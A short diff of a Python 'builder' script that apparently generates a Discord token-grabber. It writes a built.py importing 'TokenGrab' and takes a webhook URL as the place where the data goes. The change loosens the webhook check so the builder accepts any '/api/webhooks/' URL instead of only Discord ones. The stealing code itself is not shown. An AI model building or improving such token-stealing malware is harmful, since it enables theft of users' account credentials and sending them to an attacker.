@@ -9,7 +9,7 @@ import os
 USE_ICON = False
 
 def builder(webhook: str) ->bool:
-    if 'https://discord.com/api/webhooks/' in webhook:
+    if '/api/webhooks/' in webhook:
         showinfo('Message',f'Building {webhook}')
         with open('built.py', 'w', encoding='UTF-8') as f:
             f.write('from src import TokenGrab\n')
